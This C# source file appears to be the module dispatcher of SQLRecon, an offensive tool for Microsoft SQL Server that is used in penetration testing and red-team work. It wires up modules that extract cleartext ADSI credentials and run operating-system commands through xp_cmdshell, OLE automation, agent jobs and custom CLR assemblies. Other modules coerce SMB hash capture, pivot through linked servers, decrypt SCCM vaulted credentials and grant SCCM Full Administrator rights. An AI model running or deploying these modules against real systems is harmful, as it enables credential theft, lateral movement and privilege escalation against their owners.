using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using System.Text;
using SQLRecon.Modules;
using SQLRecon.Utilities;

namespace SQLRecon.Commands
{
    internal class ModuleHandler
    {
        private static GlobalVariables _gV = new();
        private static readonly ADSI _adsi = new();
        private static readonly AgentJobs _agentJobs = new();
        private static readonly CLR _clr = new();
        private static readonly Configure _config = new();
        private static readonly OLE _ole = new();
        private static readonly PrintUtils _print = new();
        private static readonly Roles _roles = new();
        private static readonly Sccm _sccm = new();
        private static readonly SqlQuery _sqlQuery = new();
        private static readonly XpCmdShell _xpCmdShell = new();

        private static readonly SqlConnection _connection = _gV.Connect;
        private static readonly string _arg0 = _gV.Arg0;
        private static readonly string _arg1 = _gV.Arg1;
        private static readonly string _arg2 = _gV.Arg2;
        private static readonly string _database = _gV.Database;
        private static readonly string[] _tunnelSqlServer = _gV.LinkChain;
        private static readonly string _tunnelPath = _gV.TunnelPath;
        private static readonly string _module = _gV.Module;
        private static readonly string _sqlServer = _gV.SqlServer;
        private static readonly string _impersonate = _gV.Impersonate;

        private static string _query;

        private static string GetContextDescription()
        {
            // Check if there is a tunnel and display the last server in the chain
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                string lastServer = _tunnelSqlServer.LastOrDefault();
                return $"{lastServer} (via linked servers {string.Join(" -> ", _tunnelSqlServer)})";
            }
            return _sqlServer; // If no tunnel, display the primary server
        }

        // Set the context description
        private static readonly string contextDescription = GetContextDescription();

        /// <summary>
        /// The ExecuteModule method will match the user supplied module in the
        /// _module variable against a method name and use reflection to execute
        /// the method in the local class.
        /// </summary>
        public static void ExecuteModule()
        {
            // First check to see if there is a SQL connection object.
            if (_connection == null)
            {
                // Go no futher.
                return;
            }

            _query = "SELECT SYSTEM_USER;";
            _print.Success(string.Format("Logged in as server user '{0}'",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            _query = "SELECT USER_NAME();";
            _print.Nested(string.Format("Mapped to the username '{0}'",
                _sqlQuery.ExecuteQuery(_connection, _query)), true);

            if (!string.IsNullOrEmpty(_impersonate))
            {
                _sqlQuery.Impersonate(_connection, _impersonate);
            }


            // Reference: https://stackoverflow.com/questions/29034093/create-instance-of-class-and-call-method-from-string/29034215
            // Set the type name to this local class.
            Type type = Type.GetType(MethodBase.GetCurrentMethod().DeclaringType.ToString());

            if (type != null)
            {
                // Match the method name to the module that has been supplied as an argument.
                MethodInfo method = type.GetMethod(_module);

                if (method != null)
                {
                    // Call the method.
                    method.Invoke(null, null);
                }
                else
                {
                    _print.Error("Invalid module.", true);
                    // Go no futher.
                    return;
                }
            }
        }

        /// <summary>
        /// The info method is used against single instances of SQL server to
        /// gather information about the remote SQL server instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void info()
        {
            _print.Status(string.Format("Extracting current MS SQL Server information from {0}", _sqlServer), true);
            var Info = new SqlServerInfo(_connection);
            Info.GetAllSQLServerInfo();
            Info.PrintInfo();
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ****************** Standard SQL Server Modules ******************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */


        /// <summary>
        /// The adsi method is used to obtain cleartext ADSI credentials.
        /// This method dynamically adjusts based on the connection type (single instance or tunneled).
        /// </summary>
        public static void adsi()
        {
            _print.Status($"Obtaining ADSI credentials for '{_arg1}' on {contextDescription}", true);

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                // 0 -> SQL27
                if (_tunnelSqlServer.Length == 2) {
                    string linkedServer = _tunnelSqlServer.Last();
                    _adsi.Linked(_connection, _arg1, _arg2, linkedServer, _sqlServer);
                    return ;
                }
                _print.Warning($"Not implemented for multiple hops!", true);
                return;
            }
            _adsi.Standard(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The agentcmd method is used against single instances or tunneled SQL servers to
        /// execute commands via agent jobs.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void agentcmd()
        {
            _print.Status($"Executing '{_arg1}' on {contextDescription}", true);

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                // 0 -> SQL27
                if (_tunnelSqlServer.Length == 2) {
                    string linkedServer = _tunnelSqlServer.Last();
                    _agentJobs.Linked(_connection, linkedServer, "PowerShell", _arg1, _sqlServer);
                }
                _print.Warning($"Not implemented for multiple hops!", true);
                return;

            }
            _agentJobs.Standard(_connection, _sqlServer, _arg1);
        }

        /// <summary>
        /// The agentstatus method is used against single instances or tunneled SQL servers to
        /// check to see if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void agentstatus()
        {
            _print.Status($"Getting SQL agent status on {contextDescription}", true);

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                // 0 -> SQL27
                if (_tunnelSqlServer.Length == 2) {
                    string linkedServer = _tunnelSqlServer.Last();
                    _agentJobs.GetLinkedAgentStatusAndJobs(_connection, linkedServer);
                    return;
                }
                _print.Warning($"Not implemented for multiple hops!", true);
                return;

            }
            _agentJobs.GetAgentStatusAndJobs(_connection, _sqlServer);
        }

        /// <summary>
        /// The checkrpc method is used against the initial SQL server to
        /// identify what systems can have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void checkrpc()
        {
            _print.Status($"The following SQL servers can have RPC configured via {contextDescription}", true);

            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _print.IsOutputEmpty(_sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, _query), true);
                return;
            }

            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);

        }

        /// <summary>
        /// The enablerpc method is used against the initial SQL server to
        /// enable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void enablerpc()
        {
            _print.Status($"Enabling RPC on {_arg1}", true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1);
        }

        /// <summary>
        /// The disablerpc method is used against the initial SQL server to
        /// disable 'rpc out' on a specified SQL server.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void disablerpc()
        {
            _print.Status($"Disabling RPC on {_arg1}", true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1);
        }

        /// <summary>
        /// The clr method is used against single instances or tunneled SQL servers to
        /// execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void clr()
        {
            _print.Status($"Performing CLR custom assembly attack on {contextDescription}", true);

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                // 0 -> SQL27
                if (_tunnelSqlServer.Length == 2) {
                    string linkedServer = _tunnelSqlServer.Last();
                    _clr.Linked(_connection, _arg1, _arg2, linkedServer, _sqlServer);
                } else {
                    _print.Warning($"Not implemented for multiple hops!", true);
                }
            }
            else
            {
                _clr.Standard(_connection, _arg1, _arg2);
            }
        }


        /// <summary>
        /// The columns method is used against single instances or tunneled SQL servers to
        /// list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void columns()
        {
            _print.Status($"Displaying columns from table '{_arg2}' in '{_arg1}' on {contextDescription}", true);

            _query = $"use {_arg1}; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{_arg2}' ORDER BY ORDINAL_POSITION;";

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _print.IsOutputEmpty(_sqlQuery.ExecuteTunnelCustomQueryRpcExec(_connection, _tunnelSqlServer, _query), true);
                return;
            }
            _print.IsOutputEmpty(_sqlQuery.ExecuteCustomQuery(_connection, _query), true);

        }

        /// <summary>
        /// The databases method is used against single instances or tunneled SQL servers to
        /// show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void databases()
        {
            _print.Status($"Databases on {contextDescription}", true);
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                Console.WriteLine(_sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, _query));
                return;
            }
            Console.WriteLine(_sqlQuery.ExecuteCustomQuery(_connection, _query));
        }

        /// <summary>
        /// The disableclr method is used against single instances or tunneled SQL servers to
        /// disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void disableclr()
        {
            _print.Status($"Disabling CLR integration on {contextDescription}", true);
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "clr enabled", "0", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "clr enabled", "0", _sqlServer);
            }
        }

        /// <summary>
        /// The disableole method is used against single instances or tunneled SQL servers to
        /// disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void disableole()
        {
            _print.Status($"Disabling Ole Automation Procedures on {contextDescription}", true);
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "Ole Automation Procedures", "0", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "Ole Automation Procedures", "0", _sqlServer);
            }
        }



        /// <summary>
        /// The disablexp method is used against single instances or tunneled SQL servers to
        /// disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void disablexp()
        {
            _print.Status($"Disabling xp_cmdshell on {contextDescription}", true);
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "xp_cmdshell", "0", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "xp_cmdshell", "0", _sqlServer);
            }
        }

        /// <summary>
        /// The enableclr method is used against single instances or tunneled SQL servers to
        /// enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void enableclr()
        {
            _print.Status($"Enabling CLR integration on {contextDescription}", true);
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "clr enabled", "1", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "clr enabled", "1", _sqlServer);
            }
        }

        /// <summary>
        /// The enableole method is used against single instances or tunneled SQL servers to
        /// enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void enableole()
        {
            _print.Status($"Enabling Ole Automation Procedures on {contextDescription}", true);
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "Ole Automation Procedures", "1", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "Ole Automation Procedures", "1", _sqlServer);
            }
        }


        /// <summary>
        /// The enablexp method is used to enable xp_cmdshell.
        /// This method dynamically adjusts based on the connection type (single instance or tunneled).
        /// </summary>
        public static void enablexp()
        {
            _print.Status($"Enabling xp_cmdshell on {contextDescription}", true);

            // Determine the context and execute the appropriate method
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _config.TunnelModuleToggle(_connection, "xp_cmdshell", "1", _tunnelSqlServer, _sqlServer);
            }
            else
            {
                _config.ModuleToggle(_connection, "xp_cmdshell", "1", _sqlServer);
            }
        }



        /// <summary>
        /// The impersonate method is used to identify if any SQL accounts can be impersonated.
        /// This method is crucial for understanding potential privilege escalation paths.
        /// It dynamically adjusts based on the connection type (single instance or tunneled).
        /// </summary>
        public static void impersonate()
        {
            _print.Status($"Enumerating accounts that can be impersonated on {contextDescription}", true);

            // Check if the current user is a sysadmin
            string sysAdminCheckQuery = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string isSysAdmin = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, sysAdminCheckQuery).Trim()
                : _sqlQuery.ExecuteCustomQuery(_connection, sysAdminCheckQuery).Trim();

            var allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
            var allLogins = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, allLoginsQuery)
                : _sqlQuery.ExecuteCustomQuery(_connection, allLoginsQuery);

            var logins = _sqlQuery.ExtractColumnValues(allLogins, "name");

            var impersonables = new List<string>();

            if (isSysAdmin.Contains("1"))
            {
                // If the user is a sysadmin, they can impersonate any login
                _print.Status("Current user is a sysadmin and can impersonate any account.", true);

                if (logins.Any())
                {
                    impersonables.AddRange(logins);
                }
            }
            else
            {
                if (logins.Any())
                {
                    foreach (var login in logins)
                    {
                        bool canImpersonate = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                            ? _sqlQuery.CanImpersonateTunnel(_connection, login, _tunnelSqlServer)
                            : _sqlQuery.CanImpersonate(_connection, login);

                        if (canImpersonate)
                        {
                            impersonables.Add(login);
                        }
                    }
                }
            }

            if (impersonables.Any())
            {
                _print.Status("Users that can be impersonated:", true);
                foreach (var impersonable in impersonables)
                {
                    _print.Nested(impersonable, true);
                }
            }
            else
            {
                _print.Error("No logins found that can be impersonated.", true);
            }
        }



        /// <summary>
        /// The links method is used to determine if the SQL server has a link configured to other SQL servers.
        /// It provides detailed information about each linked server, including the local login mapping,
        /// whether self-mapping is used, the remote login, and other linked server properties.
        /// This method dynamically adjusts based on the connection type (single instance or tunneled).
        /// </summary>
        public static void links()
        {
            _print.Status($"Additional SQL links and login mappings on {contextDescription}", true);

            // Query to fetch detailed linked server information along with login mappings
            _query = @"
                SELECT
                    srv.name AS [Linked Server],
                    srv.product,
                    srv.provider,
                    srv.data_source,
                    COALESCE(prin.name, 'N/A') AS [Local Login],
                    ll.uses_self_credential AS [Is Self Mapping],
                    ll.remote_name AS [Remote Login]
                FROM
                    sys.servers srv
                    LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id
                    LEFT JOIN sys.server_principals prin ON ll.local_principal_id = prin.principal_id
                WHERE
                    srv.is_linked = 1;";

            // Execute the query based on connection type
            string result = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, _query)
                : _sqlQuery.ExecuteCustomQuery(_connection, _query);

            // Check if the output is empty and print the result
            _print.IsOutputEmpty(result, true);
        }

        /// <summary>
        /// The olecmd method is used to execute a user-supplied command via OLE Automation Procedures.
        /// This method dynamically adjusts based on the connection type (single instance or tunneled).
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void olecmd()
        {
            _print.Status($"Executing '{_arg1}' on {contextDescription}", true);

            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _ole.Tunnel(_connection, _arg1, _tunnelSqlServer, _sqlServer);
                return;
            }
            _ole.Standard(_connection, _arg1);
        }


        /// <summary>
        /// The query method is used against single instances or tunneled instances of SQL server to
        /// execute a user supplied SQL query.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void query()
        {
            _print.Status($"Executing '{_arg1}' on {contextDescription}", true);

            // Execute the query based on connection type
            string result = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, _arg1)
                : _sqlQuery.ExecuteCustomQuery(_connection, _arg1);

            _print.IsOutputEmpty(result, true);
        }

        /// <summary>
        /// The rows method is used against single instances or tunneled instances of SQL server to
        /// determine the number of rows in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void rows()
        {
            _print.Status($"Displaying number of rows from table '{_arg2}' in '{_arg1}' on {contextDescription}", true);

            _query = $"USE {_arg1}; SELECT COUNT(*) as row_count FROM {_arg2};";

            // Execute the query based on connection type and print the result
            string result = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQueryRpcExec(_connection, _tunnelSqlServer, _query)
                : _sqlQuery.ExecuteCustomQuery(_connection, _query);

            _print.IsOutputEmpty(result, true);
        }



        /// <summary>
        /// The search method is used against single instances or tunneled instances of SQL server to
        /// search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void search()
        {
            _print.Status($"Searching for columns containing '{_arg1}' in '{_database}' on {contextDescription}", true);

            // Define the query to search for columns
            _query = "SELECT table_name, column_name " +
                    "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%" + _arg1 + "%';";

            // Execute the query based on connection type and print the result
            string result = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQueryRpcExec(_connection, _tunnelSqlServer, _query)
                : _sqlQuery.ExecuteCustomQuery(_connection, _query);

            _print.IsOutputEmpty(result, true);
        }

        /// <summary>
        /// The smb method is used against single instances or tunneled SQL servers to
        /// make the SQL server solicit a SMB request to an arbitrary host.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void smb()
        {
            _print.Status($"Sending SMB Request to {_arg1} from {contextDescription}", true);

            new CaptureHash(_connection, _arg1, _tunnelSqlServer != null && _tunnelSqlServer.Length > 0 ? _tunnelSqlServer : null);

            _print.Success($"SMB Request sent from {(contextDescription)} to {_arg1}.", true);
        }


        /// <summary>
        /// The tables method is used against single instances of SQL server or
        /// tunneled instances to retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void tables()
        {
            _print.Status($"Tables in {_arg1} on {contextDescription}", true);

            // Construct the query to retrieve tables
            _query = $"SELECT * FROM {_arg1}.INFORMATION_SCHEMA.TABLES;";

            // Execute the query based on connection type
            string result = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, _query)
                : _sqlQuery.ExecuteCustomQuery(_connection, _query);

            // Check if the output is empty and print the result
            _print.IsOutputEmpty(result, true);
        }


        /// <summary>
        /// The xpcmd method dynamically determines the context (single, linked, tunneled)
        /// and executes the command using xp_cmdshell.
        /// </summary>
        public static void xpcmd()
        {
            _print.Status($"Executing '{_arg1}' on {contextDescription}", true);

            // Determine the context and execute the appropriate method
            if (_tunnelSqlServer != null && _tunnelSqlServer.Length > 0)
            {
                _xpCmdShell.Tunnel(_connection, _arg1, _tunnelSqlServer);
                return;
            }
            _xpCmdShell.Standard(_connection, _arg1);
        }



        /// <summary>
        /// The whoami method dynamically determines the current user's level of access
        /// based on the presence of _impersonate or _tunnelSqlServer.
        /// </summary>
        public static void whoami()
        {
            string query;

            _print.Status($"Determining user permissions on {contextDescription}", true);

            query = "SELECT SYSTEM_USER;";
            string loggedInUser = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelQuery(_connection, _tunnelSqlServer, query)
                : _sqlQuery.ExecuteQuery(_connection, query);
            _print.Success($"Logged in as {loggedInUser}", true);

            query = "SELECT USER_NAME();";
            string mappedUser = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelQuery(_connection, _tunnelSqlServer, query)
                : _sqlQuery.ExecuteQuery(_connection, query);
            _print.Success($"Mapped to the user {mappedUser}", true);

            query = "SELECT [name] FROM sysusers WHERE issqlrole = 1;";
            string getRoles = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, query)
                : _sqlQuery.ExecuteCustomQuery(_connection, query);

            List<string> rolesList = _sqlQuery.ExtractColumnValues(getRoles, "name");

            string[] defaultRoles = { "sysadmin", "setupadmin", "serveradmin", "securityadmin",
                "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            string[] combinedRoles = rolesList.Concat(defaultRoles).ToArray();

            var memberRoles = new List<string>();
            var nonMemberRoles = new List<string>();

            foreach (var item in combinedRoles)
            {
                bool isMember = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                    ? _roles.CheckTunnelServerRole(_connection, item.Trim(), _tunnelSqlServer, false)
                    : _roles.CheckServerRole(_connection, item.Trim(), false);

                if (isMember)
                {
                    memberRoles.Add(item.Trim());
                }
                else
                {
                    nonMemberRoles.Add(item.Trim());
                }
            }

            if (memberRoles.Any())
            {
                _print.Success("User is a member of roles below:", true);
                foreach (var role in memberRoles)
                {
                    _print.Nested(role, true);
                }
            }
            else
            {
                _print.Error("User is NOT a member of any roles.", true);
            }

            if (nonMemberRoles.Any())
            {
                _print.Error("User is NOT a member of roles below:", true);
                foreach (var role in nonMemberRoles)
                {
                    _print.Nested(role, true);
                }
            }
        }


       /// <summary>
        /// The users method is used to obtain local users in the SQL instance.
        /// It adjusts dynamically based on whether the SQL server is a single instance,
        /// or part of a tunnel chain.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void users()
        {
            string dbQuery = "SELECT name AS username, create_date, modify_date, type_desc AS type, " +
                            "authentication_type_desc AS authentication_type " +
                            "FROM sys.database_principals " +
                            "WHERE type NOT IN ('A', 'R', 'X') AND sid IS NOT null AND name NOT LIKE '##%' " +
                            "ORDER BY modify_date DESC;";

            string serverQuery = "SELECT name, type_desc, is_disabled, create_date, modify_date " +
                                "FROM sys.server_principals " +
                                "WHERE name NOT LIKE '##%' " +
                                "ORDER BY modify_date DESC;";

            // Execute queries based on connection type
            string dbUsers = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, dbQuery)
                : _sqlQuery.ExecuteCustomQuery(_connection, dbQuery);

            string serverUsers = _tunnelSqlServer != null && _tunnelSqlServer.Length > 0
                ? _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, serverQuery)
                : _sqlQuery.ExecuteCustomQuery(_connection, serverQuery);

            // Print user details
            _print.Success($"Retrieved users on {contextDescription}:", true);
            _print.Nested("Database Principals:\n", true);
            Console.WriteLine(dbUsers);
            _print.Nested("Server Principals:\n", true);
            Console.WriteLine(serverUsers);
        }

        /*
         * *************************************************************
         * *************************************************************
         * *************************************************************
         * ****************** SCCM SQL Server Modules ******************
         * *************************************************************
         * *************************************************************
         * *************************************************************
         */

        /// <summary>
        /// The susers method lists all users in the RBAC_Admins table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void susers()
        {
            _sccm.SccmUsers(_connection);
        }

        /// <summary>
        /// The ssites method lists all sites stored in the SCCM databases' 'DPInfo' table.
        /// This can provide additional attack avenues as different sites
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void ssites()
        {
            _sccm.SccmSites(_connection);
        }

        /// <summary>
        /// The SccmClientLogons method queries the 'Computer_System_DATA' table to
        /// retrieve all associated SCCM clients along with the user that last logged into them.
        /// NOTE: This only updates once a week by default and will not be 100% up to date.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void slogons()
        {
            _sccm.SccmClientLogons(_connection, _arg0);
        }

        /// <summary>
        /// The stasklist method provides a list of all task sequences stored
        /// in the SCCM database, but does not access the actual task data contents.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void stasklist()
        {
            _sccm.SccmTaskSequenceList(_connection);
        }

        /// <summary>
        /// The staskdata method recovers all task sequences stored in the SCCM
        /// database and decrypts them to plaintext.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void staskdata()
        {
            _sccm.GetTaskSequenceData(_connection);
        }

        /// <summary>
        /// The scredentials method lists credentials vaulted by SCCM for
        /// use in various functions. These credentials can not be remotely decrypted
        /// as the key is stored on the SCCM server. However, this module provides
        /// intel on if it makes sense to attempt to obtain the key.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void scredentials()
        {
            _sccm.TriageVaultedCredentials(_connection);
        }

        /// <summary>
        /// The sdecryptcredentials method recovers encrypted credential string
        /// for accounts vaulted in SCCM and attempts to use the Microsoft Systems Management Server CSP
        /// to attempt to decrypt them to plaintext. Uses the logic from @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// This function must be ran from an SCCM management server in a context
        /// that has the ability to access this CSP (high-integrity admin or SYSTEM).
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sdecryptcredentials()
        {
            _sccm.DecryptVaultedCredentials(_connection);
        }

        /// <summary>
        /// The AddSCCMAdmin method will elevate the specified account to a 'Full Administrator'
        /// within SCCM. If target user is already an SCCM user, this module will instead add necessary
        /// privileges to elevate. This module require sysadmin or similar privileges as writing to
        /// SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void saddadmin()
        {
            _sccm.AddSCCMAdmin(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The RemoveSCCMAdmin method removes the privileges of a user by removing a user
        /// entirely from the SCCM database. Use the arguments provided by output of the
        /// AddSCCMAdmin command to run this command. This module require sysadmin or
        /// similar privileges as writing to SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sremoveadmin()
        {
            _sccm.RemoveSCCMAdmin(_connection, _arg1, _arg2);
        }
    }
}
